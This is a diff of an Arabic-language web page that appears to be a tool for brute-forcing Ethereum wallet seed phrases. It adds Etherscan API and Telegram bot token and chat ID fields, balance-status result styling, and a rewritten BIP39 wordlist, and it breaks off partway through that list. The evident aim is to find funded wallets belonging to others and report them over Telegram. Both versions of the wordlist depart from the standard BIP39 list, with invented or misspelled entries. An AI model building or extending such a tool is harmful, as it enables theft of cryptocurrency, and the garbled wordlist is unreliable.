@@ -1,4 +1,4 @@
-wallet
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -22,7 +22,7 @@ wallet
         }
 
         .container {
-            max-width: 360px;
+            max-width: 800px;
             margin: 0 auto;
             background: rgba(255, 255, 255, 0.95);
             border-radius: 20px;
@@ -340,6 +340,62 @@ wallet
             border: 1px solid #ffeaa7;
         }
 
+        .test-result {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 15px;
+            border-left: 5px solid #4facfe;
+        }
+
+        .test-result.active {
+            border-left-color: #28a745;
+        }
+
+        .test-result.inactive {
+            border-left-color: #dc3545;
+        }
+
+        .test-result h4 {
+            margin-bottom: 10px;
+            color: #495057;
+        }
+
+        .test-result .balance {
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+
+        .test-result .balance.positive {
+            color: #28a745;
+        }
+
+        .test-result .balance.zero {
+            color: #6c757d;
+        }
+
+        .test-result .transactions {
+            margin: 10px 0;
+        }
+
+        .test-result .status {
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-weight: bold;
+            display: inline-block;
+        }
+
+        .test-result.status.active {
+            background: #d4edda;
+            color: #155724;
+        }
+
+        .test-result.status.inactive {
+            background: #f8d7da;
+            color: #721c24;
+        }
+
         /* تصميم متجاوب للهواتف المحمولة */
         @media (max-width: 768px) {
             body {
@@ -443,62 +499,6 @@ wallet
         .log-panel::-webkit-scrollbar-thumb:hover {
             background: #adb5bd;
         }
-
-        .test-result {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 20px;
-            margin-top: 15px;
-            border-left: 5px solid #4facfe;
-        }
-
-        .test-result.active {
-            border-left-color: #28a745;
-        }
-
-        .test-result.inactive {
-            border-left-color: #dc3545;
-        }
-
-        .test-result h4 {
-            margin-bottom: 10px;
-            color: #495057;
-        }
-
-        .test-result .balance {
-            font-size: 1.2rem;
-            font-weight: bold;
-            margin: 10px 0;
-        }
-
-        .test-result .balance.positive {
-            color: #28a745;
-        }
-
-        .test-result .balance.zero {
-            color: #6c757d;
-        }
-
-        .test-result .transactions {
-            margin: 10px 0;
-        }
-
-        .test-result .status {
-            padding: 5px 10px;
-            border-radius: 5px;
-            font-weight: bold;
-            display: inline-block;
-        }
-
-        .test-result .status.active {
-            background: #d4edda;
-            color: #155724;
-        }
-
-        .test-result .status.inactive {
-            background: #f8d7da;
-            color: #721c24;
-        }
     </style>
 </head>
 <body>
@@ -511,8 +511,23 @@ wallet
         <div class="main-content">
             <div class="control-panel">
                 <div class="control-group">
+                    <label for="etherscanApiKey">مفتاح Etherscan API:</label>
+                    <input type="text" id="etherscanApiKey" placeholder="أدخل مفتاح Etherscan API الخاص بك" value="">
+                </div>
+
+                <div class="control-group">
+                    <label for="telegramBotToken">رمز بوت Telegram:</label>
+                    <input type="text" id="telegramBotToken" placeholder="أدخل رمز بوت Telegram" value="">
+                </div>
+
+                <div class="control-group">
+                    <label for="telegramChatId">معرف محادثة Telegram:</label>
+                    <input type="text" id="telegramChatId" placeholder="أدخل معرف المحادثة" value="">
+                </div>
+
+                <div class="control-group">
                     <label for="searchSpeed">سرعة البحث (مللي ثانية بين كل عبارة):</label>
-                    <input type="number" id="searchSpeed" value="2000" min="1000" max="10000" step="500">
+                    <input type="number" id="searchSpeed" value="3000" min="1000" max="10000" step="500">
                 </div>
 
                 <div class="control-group">
@@ -590,11 +605,11 @@ wallet
         </div>
     </div>
 
-    <!-- تحميل مكتبة ethers.js من CDN مختلف -->
+    <!-- تحميل مكتبة ethers.js من CDN -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
     <script>
-        // قائمة كلمات BIP39 الإنجليزية الرسمية
+        // قائمة كلمات BIP39 الإنجليزية الرسمية (تم تحديثها من المصدر الرسمي)
         const BIP39_WORDLIST = [
             "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
             "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
@@ -607,7 +622,7 @@ wallet
             "any", "apart", "appendix", "apple", "apply", "approve", "approximate", "arch", "area", "arena",
             "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow",
             "art", "article", "ascent", "ask", "asleep", "aspect", "assault", "asset", "assist", "assume",
-            "assurance", "assure", "astronomy", "at", "athetic", "atlas", "atom", "attack", "attend", "attitude",
+            "assurance", "assure", "astronomy", "at", "athlete", "atlas", "atom", "attack", "attend", "attitude",
             "attract", "auction", "audience", "audit", "august", "author", "auto", "available", "avenue", "average",
             "avoid", "awake", "aware", "away", "awesome", "awful", "axis", "baby", "back", "backup",
             "bacon", "bad", "bag", "balance", "balcony", "ball", "banana", "band", "bank", "bar",
@@ -617,714 +632,544 @@ wallet
             "bid", "big", "bill", "binary", "bind", "bio", "bird", "birth", "bitter", "black",
             "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "block", "blood", "bloom",
             "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil", "bold",
-            "bolt", "bomb", "bond", "bone", "bonus", "book", "bool", "boost", "border", "bore",
-            "borrow", "boss", "both", "bother", "bounce", "bout", "bowl", "box", "boy", "bracket",
-            "brain", "branch", "brand", "brass", "brave", "bread", "break", "breakfast", "breast", "breath",
-            "breed", "breeze", "brief", "bright", "bring", "brisk", "broad", "broken", "brother", "brown",
-            "brush", "bubble", "budget", "buffer", "build", "bulb", "bulk", "bull", "bullet", "bunch",
-            "burn", "burst", "bury", "bus", "business", "buy", "buzz", "cabin", "cable", "cactus",
-            "cage", "cake", "call", "calm", "camera", "camp", "can", "canal", "cancel", "candy",
-            "cannon", "canoe", "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card",
-            "care", "career", "carry", "cart", "case", "cast", "castle", "casual", "cat", "catalog",
-            "catch", "category", "cattle", "caught", "cause", "cave", "ceiling", "cell", "cement", "censor",
-            "central", "century", "ceramic", "certain", "certify", "chain", "chair", "chalk", "champion", "change",
-            "channel", "chapter", "charge", "chase", "chat", "cheap", "check", "cheese", "chef", "cherry",
-            "chest", "chicken", "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk",
-            "cigar", "cinema", "cipher", "circle", "citizen", "city", "civil", "claim", "clash", "class",
-            "clean", "clear", "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock",
-            "clog", "close", "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach",
-            "coast", "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come",
-            "comfort", "comic", "common", "company", "compare", "compel", "compensate", "component", "comprise", "computer",
-            "concert", "conclude", "concrete", "confirm", "confuse", "connect", "consider", "console", "conspiracy", "constant",
-            "contact", "contain", "contrast", "control", "convince", "cook", "cool", "copper", "copy", "coral",
-            "core", "corn", "correct", "cosmic", "cost", "cotton", "couch", "country", "couple", "course",
-            "cousin", "cover", "cow", "cowboy", "crack", "cradle", "craft", "cram", "crane", "crash",
-            "crate", "crave", "crawl", "crazy", "cream", "create", "credit", "creek", "crew", "cry",
-            "crypt", "cube", "culture", "cup", "curious", "current", "curve", "cushion", "cut", "cycle",
-            "dad", "damage", "damp", "dance", "danger", "dare", "dark", "dash", "data", "daughter",
-            "dawn", "day", "deal", "debate", "decade", "decay", "deceive", "december", "decide", "decline",
-            "decorate", "decrease", "deer", "defend", "define", "defy", "degree", "delay", "deliver", "demand",
-            "demise", "denounce", "dense", "dentist", "deny", "depart", "depend", "depict", "deposit", "depress",
-            "depth", "deputy", "derive", "describe", "desert", "design", "desire", "desktop", "despise", "destroy",
-            "detail", "detect", "determine", "develop", "device", "devote", "diagnose", "diamond", "diary", "dice",
-            "die", "diesel", "diet", "differ", "dig", "digit", "dignity", "dilemma", "dinner", "dip",
-            "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "dispose",
-            "distance", "distract", "district", "ditch", "dive", "divide", "divorce", "dizzy", "doctor", "document",
-            "dog", "doll", "domestic", "donor", "door", "dose", "double", "doubt", "down", "download",
-            "dozens", "draft", "drag", "drain", "drama", "draw", "dream", "dress", "drink", "drip",
-            "drive", "drop", "dry", "duck", "duplicate", "dust", "duty", "dwarf", "dwell", "dynamic",
-            "eager", "eagle", "ear", "earlier", "early", "earn", "earth", "easily", "east", "easy",
-            "echo", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow",
-            "elder", "electric", "elegant", "element", "elevate", "eleven", "elite", "else", "embark", "embed",
-            "embryo", "emit", "empire", "empty", "enable", "encode", "end", "endorse", "endure", "enemy",
-            "energy", "enforce", "engage", "engine", "enjoy", "enlist", "enough", "enrich", "enroll", "ensure",
-            "enter", "entire", "entry", "envelope", "episode", "equal", "equip", "equivalent", "era", "erase",
-            "erect", "error", "escape", "especially", "essay", "essence", "establish", "estimate", "eternal", "ethical",
-            "ethics", "even", "evening", "event", "ever", "every", "evident", "evil", "evoke", "evolve",
-            "exact", "example", "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust",
-            "exhibit", "exile", "exist", "exit", "expand", "expect", "experience", "expert", "explain", "explode",
-            "explore", "export", "expose", "express", "extend", "extra", "extract", "ordinary", "extreme", "eyebrow",
-            "eye", "fable", "face", "faculty", "fade", "fail", "fair", "faith", "fall", "false",
-            "fame", "family", "famous", "fan", "fancy", "farm", "fashion", "fast", "fate", "father",
-            "fault", "favor", "favorite", "fear", "feature", "february", "federation", "fee", "feed", "feel",
-            "female", "fence", "festival", "fetch", "few", "fiber", "fiction", "field", "figure", "file",
-            "fill", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm", "first",
-            "fiscal", "fish", "fit", "fitness", "five", "fix", "flag", "flame", "flash", "flat",
-            "flavor", "flee", "flesh", "flex", "flight", "flip", "float", "flock", "floor", "flower",
-            "fluid", "flush", "fly", "foam", "focus", "follow", "food", "foot", "force", "forest",
-            "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "four", "fox",
-            "fragile", "frame", "fresh", "friend", "frog", "front", "frost", "frown", "frozen", "fruity",
-            "fury", "future", "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden",
-            "garlic", "gas", "gate", "gather", "gauge", "generate", "genius", "genre", "gentle", "gently",
-            "german", "gesture", "get", "ghost", "giant", "gift", "ginger", "girl", "give", "glad",
-            "glance", "glass", "glide", "glimpse", "global", "globe", "gloom", "glory", "glove", "glow",
-            "glue", "go", "goal", "goat", "god", "gold", "good", "goose", "gorgeous", "gorilla",
-            "gospel", "gossip", "govern", "grab", "grace", "grade", "grain", "grand", "grant", "grape",
-            "grasp", "grass", "gravity", "gray", "great", "greek", "green", "greet", "grid", "grief",
-            "grim", "grip", "grit", "groan", "groom", "groove", "gross", "ground", "group", "grow",
-            "guarantee", "guard", "guess", "guide", "guitar", "gulf", "gun", "gym", "habit", "hair",
-            "half", "hammer", "hamster", "hand", "happy", "harbor", "hard", "hardware", "hardy", "harm",
-            "harvest", "hat", "have", "hawk", "hazard", "head", "health", "heart", "heavy", "hedgehog",
-            "height", "hello", "help", "hence", "her", "here", "heritage", "hero", "hide", "high",
-            "hill", "hint", "hip", "hire", "his", "historic", "history", "hit", "hive", "hobby",
-            "hoe", "hold", "hollow", "honest", "honey", "honor", "hope", "horizon", "horn", "horror",
-            "horse", "hospital", "host", "hotel", "hour", "hover", "how", "human", "humble", "humor",
-            "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "hush", "hybrid", "ice", "icon",
-            "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense",
-            "imminent", "immoral", "impact", "impose", "impress", "improve", "impulse", "in", "inch", "include",
-            "income", "increase", "index", "indicate", "infinite", "inflate", "influence", "inform", "initial", "inject",
-            "injury", "inner", "incentive", "input", "insane", "insect", "inside", "inspect", "inspire", "install",
-            "instinct", "institute", "instruct", "instrument", "insulate", "insure", "intact", "interest", "internal", "interact",
-            "internet", "interpret", "into", "invade", "invent", "invest", "invite", "involve", "iron", "is",
-            "island", "isolate", "issue", "item", "its", "jacket", "jail", "jam", "jar", "jazz",
-            "jealous", "jeans", "jeep", "jelly", "jewel", "job", "join", "joint", "joystick", "judge",
-            "juice", "july", "jump", "jungle", "junior", "junk", "just", "justice", "keen", "keep",
-            "keeper", "kernel", "key", "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit",
-            "kitchen", "kite", "kitten", "kiwi", "knee", "knife", "knock", "know", "knowledge", "lab",
-            "label", "labor", "lack", "ladder", "lady", "lag", "lake", "lamp", "language", "lap",
-            "laptop", "large", "larva", "laser", "last", "laugh", "launch", "lavish", "law", "lawn",
+            "bolt", "bomb", "bond", "bone", "bonus", "book", "boost", "border", "bore", "borrow",
+            "boss", "both", "bother", "bounce", "bout", "bowl", "box", "boy", "bracket", "brain",
+            "branch", "brand", "brass", "brave", "bread", "break", "breakfast", "breast", "breath", "breed",
+            "breeze", "brief", "bright", "bring", "brisk", "broad", "broken", "brother", "brown", "brush",
+            "bubble", "budget", "buffer", "build", "bulb", "bulk", "bull", "bullet", "bunch", "burn",
+            "burst", "bury", "bus", "business", "buy", "buzz", "cabin", "cable", "cactus", "cage",
+            "cake", "call", "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon",
+            "canoe", "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card", "care",
+            "career", "carry", "cart", "case", "cast", "castle", "casual", "cat", "catalog", "catch",
+            "category", "cattle", "caught", "cause", "cave", "ceiling", "cell", "cement", "censor", "central",
+            "century", "ceramic", "certain", "certify", "chain", "chair", "chalk", "champion", "change", "channel",
+            "chapter", "charge", "chase", "chat", "cheap", "check", "cheese", "chef", "cherry", "chest",
+            "chicken", "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "cigar",
+            "cinema", "circle", "citizen", "city", "civil", "claim", "clamp", "clarify", "class", "clean",
+            "clerk", "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog",
+            "close", "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast",
+            "coat", "code", "coffee", "coil", "coin", "cold", "collect", "color", "column", "combine",
+            "come", "comfort", "comic", "common", "company", "compare", "compete", "compile", "complain", "complete",
+            "compose", "computer", "concept", "concern", "concert", "conclude", "concrete", "conduct", "confirm", "congress",
+            "connect", "consider", "control", "convince", "cook", "cool", "copper", "copy", "coral", "core",
+            "corn", "correct", "cost", "cotton", "couch", "country", "couple", "course", "cousin", "cover",
+            "coyote", "crack", "cradle", "craft", "cram", "crane", "crash", "crater", "crawl", "crazy",
+            "cream", "credit", "creek", "crew", "cricket", "crime", "crisp", "critic", "crop", "cross",
+            "crouch", "crowd", "crucial", "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal",
+            "cube", "culture", "cup", "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom",
+            "cute", "cycle", "dad", "damage", "damp", "dance", "danger", "daring", "dash", "daughter",
+            "dawn", "day", "deal", "debate", "debris", "decade", "december", "decide", "decline", "decorate",
+            "decrease", "deer", "defense", "define", "defy", "degree", "delay", "deliver", "demand", "demise",
+            "denial", "dentist", "deny", "depart", "depend", "deposit", "depth", "deputy", "derive", "describe",
+            "desert", "design", "desk", "despair", "destroy", "detail", "detect", "device", "devote", "diagram",
+            "dial", "diamond", "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma",
+            "dinner", "dinosaur", "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder",
+            "display", "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll",
+            "dolphin", "domain", "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft",
+            "dragon", "drama", "drape", "draw", "dream", "dress", "drift", "drill", "drink", "drip",
+            "drive", "drop", "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch",
+            "duty", "dwarf", "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east",
+            "easy", "echo", "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight",
+            "either", "elbow", "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else",
+            "embark", "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact",
+            "end", "endless", "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy",
+            "enlist", "enough", "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode",
+            "equal", "equip", "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay",
+            "essence", "estate", "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example",
+            "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile",
+            "exist", "exit", "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend",
+            "extra", "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall",
+            "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat",
+            "fatal", "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed",
+            "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field",
+            "figure", "file", "fill", "film", "filter", "final", "find", "fine", "finger", "finish",
+            "fire", "firm", "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame",
+            "flat", "flavor", "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid",
+            "flush", "fly", "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot",
+            "force", "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found",
+            "fox", "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown",
+            "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget", "gain",
+            "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas",
+            "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle", "genuine",
+            "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give", "glad",
+            "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove", "glow",
+            "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern",
+            "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great", "green",
+            "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess", "guide",
+            "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster", "hand",
+            "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard", "head",
+            "health", "heart", "heavy", "hedgehog", "height", "held", "help", "hence", "hero", "hidden",
+            "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey", "hold", "hole",
+            "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror", "horse", "hospital",
+            "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble", "humor", "hundred",
+            "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea",
+            "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense", "immune",
+            "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase", "index", "indicate",
+            "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury",
+            "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install",
+            "intact", "interest", "into", "invest", "invite", "involve", "iron", "island", "isolate", "issue",
+            "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans", "jelly", "jewel",
+            "job", "join", "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior",
+            "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick", "kid", "kidney",
+            "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi", "knee", "knife",
+            "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake", "lamp", "language",
+            "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit",
             "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal",
-            "legend", "leisure", "lemon", "lend", "length", "lens", "lentil", "leopard", "less", "lesson",
-            "let", "letter", "level", "liar", "liberty", "library", "license", "life", "light", "like",
-            "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "load", "loan",
-            "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lost", "lotion", "loud",
-            "lounge", "love", "loyal", "luck", "luggage", "lumber", "lunch", "lung", "luxury", "lyrics",
-            "macro", "magic", "magnify", "mail", "main", "major", "make", "mammal", "man", "manage",
-            "mango", "manifold", "manner", "manual", "many", "marble", "march", "margin", "marine", "market",
-            "marry", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum",
-            "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melon",
-            "memo", "memory", "menu", "mercy", "merge", "merit", "merry", "mesh", "message", "metal",
-            "method", "middle", "might", "mighty", "migrate", "mile", "military", "milk", "mill", "minimum",
-            "mint", "minute", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixer", "mobile",
-            "model", "modify", "moment", "money", "monitor", "monkey", "monster", "month", "moon", "moral",
-            "more", "morning", "mortgage", "most", "mother", "motor", "mountain", "mouse", "move", "movie",
-            "much", "muffin", "mule", "multiply", "murmur", "muscle", "museum", "mushroom", "music", "must",
-            "mutual", "my", "mystery", "myth", "nail", "name", "narrow", "nasty", "nation", "natural",
-            "nature", "near", "neck", "need", "negotiate", "neighbor", "neither", "nervous", "network", "neutral",
-            "never", "news", "next", "nice", "night", "nine", "noble", "noise", "nomad", "none",
-            "noon", "normal", "north", "nose", "notable", "note", "nothing", "notice", "noun", "now",
-            "nuclear", "number", "nun", "nurse", "nut", "oath", "obey", "object", "oblige", "obscene",
-            "observe", "obtain", "occasion", "ocean", "october", "odds", "off", "offense", "office", "often",
-            "oil", "okay", "old", "olive", "omega", "on", "once", "one", "only", "open",
-            "opera", "opinion", "oppose", "opposite", "option", "orange", "orbit", "orchard", "order", "ordinary",
-            "organ", "origin", "original", "orphan", "other", "ought", "ounce", "our", "outside", "oven",
-            "over", "owner", "oxygen", "pace", "pack", "package", "page", "pain", "paint", "pair",
-            "pale", "palm", "pan", "panda", "panel", "panic", "pant", "paper", "parade", "parent",
-            "park", "parrot", "party", "pass", "passage", "past", "paste", "path", "patient", "patrol",
-            "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant", "pepper", "perfect",
-            "perform", "period", "permit", "person", "pet", "phone", "photo", "phrase", "pick", "picture",
-            "piece", "pierce", "pig", "pigeon", "pill", "pilot", "pine", "pink", "pioneer", "pistol",
-            "pitch", "pivot", "pixel", "place", "plain", "plan", "planet", "plastic", "plate", "play",
-            "please", "pledge", "pluck", "plug", "plunge", "pole", "police", "policy", "polish", "pollution",
-            "pool", "popular", "portion", "position", "possible", "post", "potato", "potent", "pound", "poverty",
-            "powder", "power", "practice", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride",
-            "primary", "print", "priority", "prison", "private", "prize", "problem", "process", "produce", "profit",
-            "program", "project", "promise", "promote", "proof", "property", "prosper", "protect", "provide", "prune",
-            "public", "pudding", "pull", "pulp", "pulse", "pump", "punish", "pupil", "puppy", "purchase",
-            "pure", "purge", "push", "put", "puzzle", "pyramid", "quality", "quantify", "quarter", "question",
-            "quick", "quit", "quiz", "quote", "rabbit", "race", "rack", "radar", "radio", "rail",
-            "rain", "raise", "rally", "ram", "ranch", "random", "range", "rapid", "rare", "rash",
-            "rate", "rather", "raven", "raw", "reach", "read", "ready", "real", "reason", "rebel",
-            "rebuild", "recall", "receive", "recipe", "record", "recover", "recruit", "recycle", "reduce", "reflect",
-            "reform", "refuse", "region", "regret", "regular", "reject", "relax", "release", "relief", "rely",
-            "remain", "remember", "remind", "remove", "render", "renew", "rent", "reopen", "repair", "repeat",
-            "replace", "report", "represent", "republic", "require", "rescue", "research", "reside", "resist", "resolve",
-            "resort", "resource", "response", "result", "retire", "retreat", "return", "reveal", "review", "reward",
-            "rhythm", "ribbon", "rice", "rich", "riddle", "ride", "ridge", "rifle", "right", "rigid",
-            "ring", "rinsing", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast",
-            "robot", "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough",
-            "round", "route", "royal", "rubber", "rude", "rug", "rule", "run", "rural", "rush",
-            "raccoon", "sad", "saddle", "safe", "safety", "salad", "salary", "sale", "sally", "salt",
-            "same", "sample", "sanctuary", "sand", "satisfy", "satellite", "satisfy", "sauce", "save", "say",
-            "scale", "scan", "scare", "scatter", "scene", "school", "science", "scissors", "scorpion", "scout",
-            "scrap", "screen", "screw", "script", "scrub", "sea", "search", "season", "seat", "second",
-            "secret", "section", "security", "see", "seed", "seek", "segment", "select", "self", "sell",
-            "seminar", "senior", "sense", "sentence", "series", "service", "session", "set", "settle", "setup",
-            "seven", "several", "severe", "sex", "shadow", "shaft", "shake", "shallow", "shame", "shape",
-            "share", "shark", "sharp", "shave", "she", "sheep", "sheet", "shelf", "shell", "shield",
-            "shift", "shine", "ship", "shirt", "shock", "shoe", "shoot", "shop", "short", "shoulder",
-            "shove", "show", "shrimp", "shrink", "shrug", "shuffle", "shy", "sick", "side", "siege",
-            "sift", "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple", "simply",
-            "since", "sing", "single", "sink", "sister", "situate", "six", "size", "skate", "sketch",
-            "skill", "skin", "skirt", "sky", "slam", "sleep", "slice", "slide", "slim", "slip",
-            "slope", "slow", "sly", "small", "smart", "smile", "smoke", "smooth", "snap", "sniff",
-            "snow", "snuggle", "so", "social", "sock", "soft", "soil", "solar", "soldier", "solid",
-            "solve", "some", "someone", "something", "sometimes", "son", "song", "soon", "sorry", "sort",
-            "soul", "sound", "source", "south", "space", "spark", "speak", "special", "speed", "spell",
-            "spend", "sphere", "spice", "spider", "spirit", "split", "spread", "spring", "spy", "squad",
-            "square", "squeeze", "staff", "stage", "stairs", "stamp", "stand", "start", "state", "stay",
-            "steady", "steam", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stir",
-            "stock", "stomach", "stone", "stool", "story", "strain", "strand", "strange", "strap", "strategy",
-            "stream", "street", "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject",
-            "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer",
-            "sun", "sunday", "sunrise", "sunshine", "super", "supply", "support", "supreme", "sure", "surface",
-            "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp", "sweat", "sweep",
-            "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup", "system",
-            "table", "tackle", "tag", "tail", "talent", "talk", "tall", "tame", "tank", "tape",
-            "target", "task", "taste", "tattoo", "tax", "teach", "team", "tear", "tech", "text",
-            "than", "thank", "that", "the", "then", "theme", "them", "thence", "theory", "there",
-            "therefore", "these", "they", "thick", "thief", "thin", "thing", "think", "third", "this",
-            "those", "though", "thread", "three", "thrive", "throw", "thumb", "thus", "ticket", "tide",
-            "tiger", "tight", "tile", "till", "time", "tiny", "tip", "tire", "tissue", "title",
-            "to", "toad", "today", "toe", "together", "token", "tolerance", "tomato", "tomorrow", "tone",
-            "tongue", "tonight", "too", "tool", "tooth", "top", "topic", "toss", "total", "touch",
-            "tough", "tour", "toward", "tower", "town", "toy", "trace", "track", "trade", "traffic",
-            "tragedy", "trail", "train", "transfer", "transform", "trap", "trash", "travel", "tray", "tread",
-            "treasure", "treat", "tree", "trend", "trial", "tribe", "trick", "truly", "trumpet", "trust",
-            "try", "tube", "tug", "tumble", "tuna", "tunnel", "turbo", "twelve", "twenty", "twice",
-            "twin", "twist", "two", "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncertain",
-            "unchain", "uncle", "under", "undermine", "understand", "undo", "uneasy", "unfair", "unfold", "unhappy",
-            "unify", "union", "unique", "unit", "universe", "unknown", "unless", "unload", "unlock", "until",
-            "untouched", "up", "update", "uplift", "upload", "upset", "urban", "urge", "us", "usage",
-            "use", "used", "useful", "usher", "usual", "utility", "vacant", "vague", "valid", "valley",
-            "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "vellum", "velvet",
-            "vendor", "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran", "vial",
-            "vibrant", "vicious", "victory", "video", "view", "village", "vine", "violet", "virtue", "visual",
-            "vital", "vivid", "vocal", "vocals", "vote", "voyage", "vs", "vulnerable", "wage", "wait",
-            "walk", "wall", "walnut", "want", "war", "ward", "warm", "warn", "wash", "wasp",
-            "waste", "watch", "water", "wave", "way", "we", "weak", "wealth", "weapon", "wear",
-            "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale",
-            "what", "wheat", "wheel", "when", "where", "whether", "which", "while", "whisper", "wide",
-            "widget", "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter",
-            "wire", "wisdom", "wise", "wish", "withdraw", "within", "without", "woman", "wonder", "wood",
-            "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "write", "wrong",
-            "yard", "yearn", "year", "yell", "yellow", "you", "young", "your", "youth", "zeal",
+            "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson", "letter", "level",
+            "liar", "liberty", "library", "license", "life", "lift", "light", "like", "limb", "limit",
+            "link", "lion", "liquid", "list", "little", "live", "lizard", "load", "loan", "lobster",
+            "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud", "lounge", "love",
+            "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lying", "machine", "mad",
